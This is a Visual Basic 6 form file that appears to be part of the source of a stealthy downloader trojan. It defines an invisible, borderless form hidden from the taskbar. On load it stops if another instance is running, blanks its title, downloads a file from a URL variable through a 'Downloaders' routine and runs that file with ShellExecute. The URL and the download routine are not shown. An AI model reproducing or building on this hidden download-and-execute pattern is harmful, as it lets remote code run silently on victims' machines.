VERSION 5.00
Begin VB.Form Form1 
   Appearance      =   0  'Flat
   BackColor       =   &H80000005&
   BorderStyle     =   0  'None
   ClientHeight    =   120
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   90
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   120
   ScaleMode       =   0  'User
   ScaleWidth      =   90
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub Form_Load()
If App.PrevInstance = True Then End
load App.path & "\" & App.EXEName & ".exe"
App.TaskVisible = False
App.Title = ""
Downloaders Trim(url)
DoEvents
ShellExecute Me.hwnd, vbNullString, Destino, vbNullString, vbNullString, 1
End
End Sub
